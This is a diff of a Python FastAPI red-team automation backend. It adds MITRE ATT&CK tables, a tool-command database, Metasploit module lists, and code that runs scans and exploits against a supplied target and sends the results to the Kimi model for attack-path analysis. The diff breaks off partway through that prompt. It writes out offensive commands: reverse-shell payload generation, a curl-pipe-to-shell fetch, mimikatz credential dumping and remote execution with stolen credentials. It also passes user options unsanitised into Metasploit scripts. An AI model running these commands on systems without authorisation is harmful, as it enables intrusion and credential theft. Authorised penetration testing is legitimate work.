@@ -18,297 +18,486 @@ import re
 ROOT_DIR = Path(__file__).parent
 load_dotenv(ROOT_DIR / '.env')
 
-# MongoDB connection
 mongo_url = os.environ['MONGO_URL']
 client = AsyncIOMotorClient(mongo_url)
 db = client[os.environ['DB_NAME']]
 
-# Kimi API configuration
 KIMI_API_KEY = os.environ.get('KIMI_API_KEY', '')
 KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"
 
-# Create the main app
-app = FastAPI(title="Kali Pentesting Automation Suite")
-
-# Create a router with the /api prefix
+app = FastAPI(title="Red Team Automation Framework")
 api_router = APIRouter(prefix="/api")
 
-# Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# In-memory scan progress tracking
 scan_progress: Dict[str, Dict[str, Any]] = {}
-
-# Attack tree storage
 attack_trees: Dict[str, Dict[str, Any]] = {}
 
-# Models
+# =============================================================================
+# MITRE ATT&CK TACTICS & TECHNIQUES DATABASE
+# =============================================================================
+MITRE_TACTICS = {
+    "reconnaissance": {
+        "id": "TA0043",
+        "name": "Reconnaissance",
+        "description": "Gathering information to plan future operations",
+        "techniques": [
+            {"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan", "zmap"]},
+            {"id": "T1592", "name": "Gather Victim Host Information", "tools": ["whatweb", "wappalyzer"]},
+            {"id": "T1589", "name": "Gather Victim Identity Info", "tools": ["theharvester", "hunter.io"]},
+            {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass", "dnsenum"]},
+            {"id": "T1591", "name": "Gather Victim Org Info", "tools": ["osint", "linkedin"]},
+            {"id": "T1593", "name": "Search Open Websites/Domains", "tools": ["google_dorks", "shodan"]},
+            {"id": "T1594", "name": "Search Victim-Owned Websites", "tools": ["dirb", "gobuster", "feroxbuster"]}
+        ]
+    },
+    "resource_development": {
+        "id": "TA0042",
+        "name": "Resource Development",
+        "description": "Establishing resources for operations",
+        "techniques": [
+            {"id": "T1583", "name": "Acquire Infrastructure", "tools": ["cloud_enum", "domain_registration"]},
+            {"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom", "veil", "shellter"]},
+            {"id": "T1588", "name": "Obtain Capabilities", "tools": ["exploit_db", "github"]}
+        ]
+    },
+    "initial_access": {
+        "id": "TA0001",
+        "name": "Initial Access",
+        "description": "Gaining initial foothold in target environment",
+        "techniques": [
+            {"id": "T1190", "name": "Exploit Public-Facing Application", "tools": ["nikto", "sqlmap", "nuclei"]},
+            {"id": "T1133", "name": "External Remote Services", "tools": ["hydra", "medusa", "crackmapexec"]},
+            {"id": "T1566", "name": "Phishing", "tools": ["gophish", "setoolkit", "evilginx2"]},
+            {"id": "T1078", "name": "Valid Accounts", "tools": ["spray", "kerbrute", "o365spray"]},
+            {"id": "T1189", "name": "Drive-by Compromise", "tools": ["beef", "browser_exploit"]}
+        ]
+    },
+    "execution": {
+        "id": "TA0002",
+        "name": "Execution",
+        "description": "Running malicious code",
+        "techniques": [
+            {"id": "T1059.001", "name": "PowerShell", "tools": ["powershell_empire", "powercat"]},
+            {"id": "T1059.003", "name": "Windows Command Shell", "tools": ["cmd", "bat_scripts"]},
+            {"id": "T1059.004", "name": "Unix Shell", "tools": ["bash", "sh", "reverse_shell"]},
+            {"id": "T1203", "name": "Exploitation for Client Execution", "tools": ["metasploit", "cobalt_strike"]}
+        ]
+    },
+    "persistence": {
+        "id": "TA0003",
+        "name": "Persistence",
+        "description": "Maintaining access across restarts",
+        "techniques": [
+            {"id": "T1547.001", "name": "Registry Run Keys", "tools": ["reg", "powershell"]},
+            {"id": "T1053", "name": "Scheduled Task/Job", "tools": ["schtasks", "cron", "at"]},
+            {"id": "T1136", "name": "Create Account", "tools": ["net_user", "useradd"]},
+            {"id": "T1543", "name": "Create/Modify System Process", "tools": ["sc", "systemctl"]},
+            {"id": "T1505.003", "name": "Web Shell", "tools": ["weevely", "china_chopper", "webshell"]}
+        ]
+    },
+    "privilege_escalation": {
+        "id": "TA0004",
+        "name": "Privilege Escalation",
+        "description": "Gaining higher-level permissions",
+        "techniques": [
+            {"id": "T1055", "name": "Process Injection", "tools": ["process_hollowing", "dll_injection"]},
+            {"id": "T1068", "name": "Exploitation for Privilege Escalation", "tools": ["linpeas", "winpeas", "suggester"]},
+            {"id": "T1548", "name": "Abuse Elevation Control", "tools": ["uac_bypass", "sudo_exploit"]},
+            {"id": "T1134", "name": "Access Token Manipulation", "tools": ["incognito", "token_impersonation"]}
+        ]
+    },
+    "defense_evasion": {
+        "id": "TA0005",
+        "name": "Defense Evasion",
+        "description": "Avoiding detection",
+        "techniques": [
+            {"id": "T1562", "name": "Impair Defenses", "tools": ["disable_av", "firewall_bypass"]},
+            {"id": "T1070", "name": "Indicator Removal", "tools": ["log_cleaner", "timestomp"]},
+            {"id": "T1036", "name": "Masquerading", "tools": ["rename", "icon_change"]},
+            {"id": "T1027", "name": "Obfuscated Files", "tools": ["upx", "veil", "donut"]},
+            {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "tools": ["vm_detect", "sandbox_escape"]}
+        ]
+    },
+    "credential_access": {
+        "id": "TA0006",
+        "name": "Credential Access",
+        "description": "Stealing credentials",
+        "techniques": [
+            {"id": "T1003", "name": "OS Credential Dumping", "tools": ["mimikatz", "secretsdump", "lazagne"]},
+            {"id": "T1555", "name": "Credentials from Password Stores", "tools": ["keychain_dump", "browser_creds"]},
+            {"id": "T1110", "name": "Brute Force", "tools": ["hydra", "hashcat", "john"]},
+            {"id": "T1558", "name": "Steal/Forge Kerberos Tickets", "tools": ["rubeus", "kekeo", "impacket"]}
+        ]
+    },
+    "discovery": {
+        "id": "TA0007",
+        "name": "Discovery",
+        "description": "Understanding the environment",
+        "techniques": [
+            {"id": "T1087", "name": "Account Discovery", "tools": ["net_user", "ldapsearch", "bloodhound"]},
+            {"id": "T1482", "name": "Domain Trust Discovery", "tools": ["nltest", "adfind", "bloodhound"]},
+            {"id": "T1046", "name": "Network Service Discovery", "tools": ["nmap", "netstat", "arp"]},
+            {"id": "T1057", "name": "Process Discovery", "tools": ["ps", "tasklist", "wmic"]},
+            {"id": "T1018", "name": "Remote System Discovery", "tools": ["ping_sweep", "crackmapexec"]}
+        ]
+    },
+    "lateral_movement": {
+        "id": "TA0008",
+        "name": "Lateral Movement",
+        "description": "Moving through the environment",
+        "techniques": [
+            {"id": "T1021.001", "name": "Remote Desktop Protocol", "tools": ["rdp", "xfreerdp", "rdesktop"]},
+            {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "tools": ["psexec", "smbexec", "wmiexec"]},
+            {"id": "T1021.004", "name": "SSH", "tools": ["ssh", "plink", "putty"]},
+            {"id": "T1021.006", "name": "Windows Remote Management", "tools": ["winrm", "evil-winrm"]},
+            {"id": "T1570", "name": "Lateral Tool Transfer", "tools": ["scp", "smb_copy", "certutil"]}
+        ]
+    },
+    "collection": {
+        "id": "TA0009",
+        "name": "Collection",
+        "description": "Gathering target data",
+        "techniques": [
+            {"id": "T1560", "name": "Archive Collected Data", "tools": ["7zip", "tar", "rar"]},
+            {"id": "T1005", "name": "Data from Local System", "tools": ["find", "dir", "tree"]},
+            {"id": "T1039", "name": "Data from Network Shared Drive", "tools": ["smb_enum", "mount"]},
+            {"id": "T1113", "name": "Screen Capture", "tools": ["screenshot", "scrot"]}
+        ]
+    },
+    "command_and_control": {
+        "id": "TA0011",
+        "name": "Command and Control",
+        "description": "Communicating with compromised systems",
+        "techniques": [
+            {"id": "T1071", "name": "Application Layer Protocol", "tools": ["http_c2", "https_c2", "dns_c2"]},
+            {"id": "T1572", "name": "Protocol Tunneling", "tools": ["chisel", "ligolo", "sshuttle"]},
+            {"id": "T1219", "name": "Remote Access Software", "tools": ["teamviewer", "anydesk", "vnc"]},
+            {"id": "T1573", "name": "Encrypted Channel", "tools": ["ssl", "tls", "ssh_tunnel"]}
+        ]
+    },
+    "exfiltration": {
+        "id": "TA0010",
+        "name": "Exfiltration",
+        "description": "Stealing data",
+        "techniques": [
+            {"id": "T1041", "name": "Exfiltration Over C2 Channel", "tools": ["c2_exfil", "beacon"]},
+            {"id": "T1048", "name": "Exfiltration Over Alternative Protocol", "tools": ["dns_exfil", "icmp_exfil"]},
+            {"id": "T1567", "name": "Exfiltration Over Web Service", "tools": ["pastebin", "discord", "telegram"]}
+        ]
+    },
+    "impact": {
+        "id": "TA0040",
+        "name": "Impact",
+        "description": "Manipulate, interrupt, or destroy systems/data",
+        "techniques": [
+            {"id": "T1485", "name": "Data Destruction", "tools": ["wipe", "shred", "dd"]},
+            {"id": "T1486", "name": "Data Encrypted for Impact", "tools": ["ransomware", "encryption"]},
+            {"id": "T1489", "name": "Service Stop", "tools": ["service_stop", "kill_process"]},
+            {"id": "T1490", "name": "Inhibit System Recovery", "tools": ["vssadmin", "bcdedit"]}
+        ]
+    }
+}
+
+# =============================================================================
+# RED TEAM TOOLS DATABASE
+# =============================================================================
+RED_TEAM_TOOLS = {
+    # RECONNAISSANCE
+    "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Network scanner - puertos, servicios, OS"},
+    "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Fastest port scanner"},
+    "subfinder": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "subfinder -d {target} -silent", "desc": "Subdomain discovery"},
+    "amass": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "amass enum -d {target}", "desc": "Attack surface mapping"},
+    "theharvester": {"phase": "reconnaissance", "mitre": "T1589", "cmd": "theHarvester -d {target} -b all", "desc": "OSINT - emails, hosts"},
+    "whatweb": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "whatweb -v {target}", "desc": "Web fingerprinting"},
+    "wafw00f": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "wafw00f {target}", "desc": "WAF detection"},
+    "gobuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt", "desc": "Directory bruteforce"},
+    "feroxbuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "feroxbuster -u {target} -w /usr/share/seclists/Discovery/Web-Content/common.txt", "desc": "Fast recursive content discovery"},
+    "shodan": {"phase": "reconnaissance", "mitre": "T1593", "cmd": "shodan search hostname:{target}", "desc": "Internet-wide scanning"},
+    "nuclei": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nuclei -u {target} -t cves/", "desc": "Vulnerability scanner with templates"},
+    
+    # INITIAL ACCESS
+    "nikto": {"phase": "initial_access", "mitre": "T1190", "cmd": "nikto -h {target}", "desc": "Web vulnerability scanner"},
+    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --dbs --batch", "desc": "SQL injection automation"},
+    "hydra": {"phase": "initial_access", "mitre": "T1110", "cmd": "hydra -L users.txt -P pass.txt {target} ssh", "desc": "Brute force login"},
+    "crackmapexec": {"phase": "initial_access", "mitre": "T1078", "cmd": "crackmapexec smb {target} -u user -p pass", "desc": "SMB/WinRM/MSSQL pentesting"},
+    "kerbrute": {"phase": "initial_access", "mitre": "T1078", "cmd": "kerbrute userenum -d DOMAIN users.txt --dc {target}", "desc": "Kerberos user enumeration"},
+    
+    # EXECUTION
+    "msfvenom": {"phase": "execution", "mitre": "T1587", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe", "desc": "Payload generation"},
+    "metasploit": {"phase": "execution", "mitre": "T1203", "cmd": "msfconsole -x 'use {module}; set RHOSTS {target}; run'", "desc": "Exploitation framework"},
+    
+    # PRIVILEGE ESCALATION
+    "linpeas": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "Linux privilege escalation audit"},
+    "winpeas": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "winPEASx64.exe", "desc": "Windows privilege escalation audit"},
+    "linux_exploit_suggester": {"phase": "privilege_escalation", "mitre": "T1068", "cmd": "linux-exploit-suggester.sh", "desc": "Kernel exploit suggester"},
+    
+    # CREDENTIAL ACCESS
+    "mimikatz": {"phase": "credential_access", "mitre": "T1003", "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit", "desc": "Windows credential dumping"},
+    "secretsdump": {"phase": "credential_access", "mitre": "T1003", "cmd": "secretsdump.py DOMAIN/user:pass@{target}", "desc": "Remote credential extraction"},
+    "hashcat": {"phase": "credential_access", "mitre": "T1110", "cmd": "hashcat -m 1000 hashes.txt wordlist.txt", "desc": "Password cracking"},
+    "john": {"phase": "credential_access", "mitre": "T1110", "cmd": "john --wordlist=rockyou.txt hashes.txt", "desc": "John the Ripper"},
+    "rubeus": {"phase": "credential_access", "mitre": "T1558", "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt", "desc": "Kerberos attacks"},
+    
+    # LATERAL MOVEMENT
+    "psexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "psexec.py DOMAIN/user:pass@{target}", "desc": "Remote execution via SMB"},
+    "wmiexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "wmiexec.py DOMAIN/user:pass@{target}", "desc": "Remote execution via WMI"},
+    "evil-winrm": {"phase": "lateral_movement", "mitre": "T1021.006", "cmd": "evil-winrm -i {target} -u user -p pass", "desc": "WinRM shell"},
+    "smbexec": {"phase": "lateral_movement", "mitre": "T1021.002", "cmd": "smbexec.py DOMAIN/user:pass@{target}", "desc": "SMB execution"},
+    
+    # POST-EXPLOITATION
+    "bloodhound": {"phase": "discovery", "mitre": "T1087", "cmd": "bloodhound-python -u user -p pass -d DOMAIN -c All", "desc": "Active Directory recon"},
+    "sharphound": {"phase": "discovery", "mitre": "T1087", "cmd": "SharpHound.exe -c All", "desc": "BloodHound collector"},
+    
+    # C2
+    "chisel": {"phase": "command_and_control", "mitre": "T1572", "cmd": "chisel server -p 8080 --reverse", "desc": "TCP/UDP tunneling"},
+    "ligolo": {"phase": "command_and_control", "mitre": "T1572", "cmd": "ligolo-ng -selfcert", "desc": "Advanced tunneling"},
+}
+
+# =============================================================================
+# METASPLOIT MODULES DATABASE (Expanded)
+# =============================================================================
+METASPLOIT_MODULES = [
+    # Exploits - Web
+    {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "desc": "Shellshock (CVE-2014-6271)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/unix/webapp/php_cgi_arg_injection", "desc": "PHP CGI Argument Injection", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/tomcat_mgr_upload", "desc": "Tomcat Manager Upload", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/struts2_content_type_ognl", "desc": "Apache Struts 2 RCE (CVE-2017-5638)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/jenkins_script_console", "desc": "Jenkins Script Console RCE", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/unix/webapp/drupal_drupalgeddon2", "desc": "Drupalgeddon2 RCE (CVE-2018-7600)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/wp_crop_rce", "desc": "WordPress Crop RCE", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/log4shell_header_injection", "desc": "Log4Shell (CVE-2021-44228)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    {"name": "exploit/multi/http/spring4shell_rce", "desc": "Spring4Shell RCE (CVE-2022-22965)", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
+    
+    # Exploits - SMB/Windows
+    {"name": "exploit/windows/smb/ms17_010_eternalblue", "desc": "EternalBlue SMB RCE (MS17-010)", "rank": "excellent", "category": "exploit", "mitre": "T1210"},
+    {"name": "exploit/windows/smb/ms08_067_netapi", "desc": "MS08-067 NetAPI RCE", "rank": "great", "category": "exploit", "mitre": "T1210"},
+    {"name": "exploit/windows/smb/psexec", "desc": "PsExec via SMB", "rank": "manual", "category": "exploit", "mitre": "T1021.002"},
+    {"name": "exploit/windows/local/always_install_elevated", "desc": "AlwaysInstallElevated Priv Esc", "rank": "excellent", "category": "exploit", "mitre": "T1548"},
+    {"name": "exploit/windows/local/bypassuac_fodhelper", "desc": "UAC Bypass via FodHelper", "rank": "excellent", "category": "exploit", "mitre": "T1548"},
+    
+    # Exploits - Linux
+    {"name": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "desc": "PwnKit Polkit Priv Esc (CVE-2021-4034)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
+    {"name": "exploit/linux/local/sudo_baron_samedit", "desc": "Sudo Baron Samedit (CVE-2021-3156)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
+    {"name": "exploit/linux/local/cve_2022_0847_dirtypipe", "desc": "Dirty Pipe (CVE-2022-0847)", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
+    
+    # Auxiliary - Scanners
+    {"name": "auxiliary/scanner/http/dir_scanner", "desc": "HTTP Directory Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1594"},
+    {"name": "auxiliary/scanner/smb/smb_ms17_010", "desc": "MS17-010 SMB Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
+    {"name": "auxiliary/scanner/ssh/ssh_login", "desc": "SSH Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
+    {"name": "auxiliary/scanner/smb/smb_login", "desc": "SMB Login Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
+    {"name": "auxiliary/scanner/http/wordpress_scanner", "desc": "WordPress Vulnerability Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
+    {"name": "auxiliary/scanner/mysql/mysql_login", "desc": "MySQL Login Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
+    {"name": "auxiliary/scanner/rdp/rdp_scanner", "desc": "RDP Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
+    {"name": "auxiliary/scanner/vnc/vnc_login", "desc": "VNC Login Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
+    
+    # Post - Windows
+    {"name": "post/windows/gather/hashdump", "desc": "Windows Password Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
+    {"name": "post/windows/gather/credentials/credential_collector", "desc": "Credential Collector", "rank": "normal", "category": "post", "mitre": "T1555"},
+    {"name": "post/multi/recon/local_exploit_suggester", "desc": "Local Exploit Suggester", "rank": "normal", "category": "post", "mitre": "T1068"},
+    {"name": "post/windows/manage/enable_rdp", "desc": "Enable RDP", "rank": "normal", "category": "post", "mitre": "T1021.001"},
+    {"name": "post/windows/manage/migrate", "desc": "Process Migration", "rank": "normal", "category": "post", "mitre": "T1055"},
+    
+    # Post - Linux
+    {"name": "post/linux/gather/hashdump", "desc": "Linux Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
+    {"name": "post/multi/gather/env", "desc": "Environment Variables", "rank": "normal", "category": "post", "mitre": "T1082"},
+    {"name": "post/linux/gather/enum_configs", "desc": "Linux Config Enumeration", "rank": "normal", "category": "post", "mitre": "T1005"},
+    
+    # Payloads for reference
+    {"name": "payload/windows/x64/meterpreter/reverse_tcp", "desc": "Windows x64 Meterpreter Reverse TCP", "rank": "normal", "category": "payload", "mitre": "T1059"},
+    {"name": "payload/linux/x64/meterpreter/reverse_tcp", "desc": "Linux x64 Meterpreter Reverse TCP", "rank": "normal", "category": "payload", "mitre": "T1059"},
+]
+
+# =============================================================================
+# MODELS
+# =============================================================================
 class ScanCreate(BaseModel):
     target: str
-    scan_types: List[str] = ["waf", "nmap", "nikto"]
+    scan_phases: List[str] = ["reconnaissance", "initial_access"]
+    tools: List[str] = []
 
-class ScanStatus(BaseModel):
-    model_config = ConfigDict(extra="ignore")
-    id: str
-    target: str
-    status: str
-    current_tool: Optional[str] = None
-    progress: int = 0
-    results: Dict[str, Any] = {}
-    ai_analysis: Optional[str] = None
-    exploit_suggestions: List[Dict[str, Any]] = []
-    created_at: str
-    updated_at: str
-
-class ScanHistoryItem(BaseModel):
-    model_config = ConfigDict(extra="ignore")
-    id: str
-    target: str
-    status: str
-    tools_used: List[str]
-    vulnerabilities_found: int
-    created_at: str
-
-class AIAnalysisRequest(BaseModel):
-    scan_id: str
-    results: Dict[str, Any]
-
-class MetasploitExploit(BaseModel):
+class ExploitExecute(BaseModel):
     scan_id: str
     node_id: str
     module: str
     target_host: str
     target_port: Optional[int] = None
     options: Dict[str, str] = {}
-
-class AttackNode(BaseModel):
-    id: str
-    parent_id: Optional[str] = None
-    type: str  # "target", "service", "vulnerability", "exploit", "access"
-    name: str
-    description: str
-    status: str = "pending"  # "pending", "testing", "success", "failed", "verified"
-    severity: Optional[str] = None  # "critical", "high", "medium", "low", "info"
-    data: Dict[str, Any] = {}
-    children: List[str] = []
+    lhost: Optional[str] = None
+    lport: Optional[int] = 4444
 
 class UpdateNodeStatus(BaseModel):
     status: str
     notes: Optional[str] = None
 
-# Helper functions
+class AddNodeRequest(BaseModel):
+    parent_id: str
+    type: str
+    name: str
+    description: str
+    severity: Optional[str] = "medium"
+    mitre_id: Optional[str] = None
+    data: Dict[str, Any] = {}
+
+# =============================================================================
+# HELPER FUNCTIONS
+# =============================================================================
 def parse_nmap_output(output: str) -> Dict[str, Any]:
-    """Parse nmap output to extract ports and services"""
     ports = []
-    lines = output.split('\n')
-    for line in lines:
+    os_info = None
+    for line in output.split('\n'):
         if '/tcp' in line or '/udp' in line:
             parts = line.split()
             if len(parts) >= 3:
-                ports.append({
-                    "port": parts[0],
-                    "state": parts[1],
-                    "service": parts[2] if len(parts) > 2 else "unknown"
-                })
-    return {"ports": ports, "raw": output}
-
-def parse_waf_output(output: str) -> Dict[str, Any]:
-    """Parse wafw00f output"""
-    waf_detected = None
-    if "is behind" in output.lower():
-        match = re.search(r'is behind (.+?)(?:\n|$)', output, re.IGNORECASE)
-        if match:
-            waf_detected = match.group(1).strip()
-    elif "no waf" in output.lower() or "no firewall" in output.lower():
-        waf_detected = "None Detected"
-    return {"waf": waf_detected, "raw": output}
+                ports.append({"port": parts[0], "state": parts[1], "service": parts[2]})
+        if 'OS:' in line or 'Running:' in line:
+            os_info = line.strip()
+    return {"ports": ports, "os": os_info, "raw": output}
 
 def parse_nikto_output(output: str) -> Dict[str, Any]:
-    """Parse nikto output for vulnerabilities"""
     vulns = []
-    lines = output.split('\n')
-    for line in lines:
+    for line in output.split('\n'):
         if line.strip().startswith('+'):
-            vulns.append(line.strip())
+            severity = "low"
+            if any(x in line.lower() for x in ['critical', 'rce', 'injection', 'xss']):
+                severity = "critical" if 'rce' in line.lower() else "high"
+            vulns.append({"finding": line.strip(), "severity": severity})
     return {"vulnerabilities": vulns, "raw": output}
 
-async def run_tool(tool: str, target: str, scan_id: str) -> Dict[str, Any]:
-    """Run a security tool and return results"""
-    logger.info(f"Running {tool} on {target}")
+async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
+    logger.info(f"Running {tool_id} on {target}")
+    tool = RED_TEAM_TOOLS.get(tool_id)
+    if not tool:
+        return {"error": f"Unknown tool: {tool_id}"}
     
     try:
-        if tool == "waf":
-            cmd = ["wafw00f", target, "-o", "-"]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-            return parse_waf_output(result.stdout + result.stderr)
-            
-        elif tool == "nmap":
-            cmd = ["nmap", "-sV", "-sC", "--top-ports", "100", "-T4", target]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            return parse_nmap_output(result.stdout)
-            
-        elif tool == "nikto":
-            cmd = ["nikto", "-h", target, "-Format", "txt", "-timeout", "10"]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-            return parse_nikto_output(result.stdout + result.stderr)
-            
-        elif tool == "whatweb":
-            cmd = ["whatweb", "-v", target]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-            return {"fingerprint": result.stdout, "raw": result.stdout}
-            
-        elif tool == "subfinder":
-            cmd = ["subfinder", "-d", target, "-silent"]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
-            subdomains = [s.strip() for s in result.stdout.split('\n') if s.strip()]
-            return {"subdomains": subdomains, "count": len(subdomains)}
-            
-        elif tool == "sn1per":
-            return {"status": "Sn1per requires manual execution", "note": "Run: sniper -t " + target}
-            
+        cmd = tool["cmd"].format(target=target, module="")
+        cmd_parts = cmd.split()
+        result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=300)
+        output = result.stdout + result.stderr
+        
+        if tool_id == "nmap":
+            return parse_nmap_output(output)
+        elif tool_id == "nikto":
+            return parse_nikto_output(output)
         else:
-            return {"error": f"Unknown tool: {tool}"}
+            return {"output": output, "raw": output}
             
     except subprocess.TimeoutExpired:
-        return {"error": f"{tool} timed out", "raw": ""}
+        return {"error": f"{tool_id} timed out", "simulated": True}
     except FileNotFoundError:
-        return {"error": f"{tool} not found - please install it", "simulated": True, "raw": f"[SIMULATED] {tool} output for {target}"}
+        # Simulate output for demo
+        return {
+            "simulated": True,
+            "tool": tool_id,
+            "phase": tool["phase"],
+            "mitre": tool["mitre"],
+            "command": tool["cmd"].format(target=target, module=""),
+            "note": f"[SIMULATED] {tool['desc']} - Install {tool_id} for real results"
+        }
     except Exception as e:
-        logger.error(f"Error running {tool}: {str(e)}")
-        return {"error": str(e), "raw": ""}
+        return {"error": str(e)}
 
-async def run_metasploit_module(module: str, target: str, port: Optional[int], options: Dict[str, str]) -> Dict[str, Any]:
-    """Execute a Metasploit module"""
-    logger.info(f"Running Metasploit module: {module} against {target}")
+async def run_metasploit(module: str, target: str, port: Optional[int], options: Dict, lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
+    logger.info(f"Running MSF module: {module} on {target}")
     
-    try:
-        # Build msfconsole command
-        rc_content = f"""
-use {module}
+    rc_content = f"""use {module}
 set RHOSTS {target}
 """
-        if port:
-            rc_content += f"set RPORT {port}\n"
-        
-        for key, value in options.items():
-            rc_content += f"set {key} {value}\n"
-        
-        rc_content += "run\nexit\n"
-        
-        # Write RC file
+    if port:
+        rc_content += f"set RPORT {port}\n"
+    if lhost:
+        rc_content += f"set LHOST {lhost}\n"
+    if lport:
+        rc_content += f"set LPORT {lport}\n"
+    for k, v in options.items():
+        rc_content += f"set {k} {v}\n"
+    rc_content += "run\nexit\n"
+    
+    try:
         rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
         with open(rc_file, 'w') as f:
             f.write(rc_content)
         
-        # Execute msfconsole
-        cmd = ["msfconsole", "-q", "-r", rc_file]
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-        
-        # Clean up
+        result = subprocess.run(["msfconsole", "-q", "-r", rc_file], capture_output=True, text=True, timeout=300)
         os.remove(rc_file)
         
-        # Parse output for success indicators
         output = result.stdout + result.stderr
-        success = False
-        session_opened = False
-        
-        if "session" in output.lower() and "opened" in output.lower():
-            session_opened = True
-            success = True
-        elif "exploit completed" in output.lower():
-            success = True
-        elif "auxiliary module execution completed" in output.lower():
-            success = True
+        success = "session" in output.lower() and "opened" in output.lower()
         
         return {
-            "module": module,
-            "target": target,
-            "port": port,
-            "success": success,
-            "session_opened": session_opened,
-            "output": output,
-            "rc_command": rc_content
+            "module": module, "target": target, "success": success,
+            "session_opened": success, "output": output, "rc_command": rc_content
         }
-        
-    except subprocess.TimeoutExpired:
-        return {"error": "Metasploit timed out", "module": module}
     except FileNotFoundError:
-        # Simulate if msfconsole not available
         return {
-            "module": module,
-            "target": target,
-            "port": port,
-            "success": False,
-            "simulated": True,
+            "module": module, "target": target, "success": False,
+            "simulated": True, "session_opened": False,
             "output": f"[SIMULATED] Metasploit execution for {module}",
-            "rc_command": f"use {module}\nset RHOSTS {target}\nrun"
+            "rc_command": rc_content,
+            "note": "Install Metasploit Framework for real exploitation"
         }
     except Exception as e:
-        logger.error(f"Error running Metasploit: {str(e)}")
         return {"error": str(e), "module": module}
 
-async def analyze_with_kimi(results: Dict[str, Any], target: str) -> Dict[str, Any]:
-    """Send results to Kimi K2 for AI analysis"""
+async def analyze_with_kimi(results: Dict[str, Any], target: str, phases: List[str]) -> Dict[str, Any]:
     if not KIMI_API_KEY:
-        return {
-            "analysis": "Kimi API key not configured. Please add KIMI_API_KEY to your environment.",
-            "exploits": [],
-            "attack_paths": []
-        }
+        return {"analysis": "Kimi API key not configured", "attack_paths": [], "recommendations": []}
     
-    prompt = f"""Eres un experto en ciberseguridad y pentesting. Analiza los siguientes resultados de escaneo para el objetivo: {target}
+    prompt = f"""Eres un experto Red Team operator. Analiza los resultados de reconocimiento y pentesting para: {target}
 
-RESULTADOS DEL ESCANEO:
+FASES EJECUTADAS: {', '.join(phases)}
+
+RESULTADOS:
 {json.dumps(results, indent=2, default=str)}
 
-Por favor proporciona un análisis estructurado:
+Proporciona un análisis táctico según MITRE ATT&CK:
 
-1. RESUMEN DE HALLAZGOS: Lista de vulnerabilidades encontradas ordenadas por severidad (Crítica, Alta, Media, Baja)
+1. **RESUMEN EJECUTIVO**: Hallazgos críticos en 3-5 líneas
 
-2. ÁRBOL DE ATAQUE: Para cada vulnerabilidad, describe la ruta de explotación como un camino:
-   - Servicio afectado → Vulnerabilidad → Exploit recomendado → Posible acceso obtenido
-   Formato JSON para cada ruta:
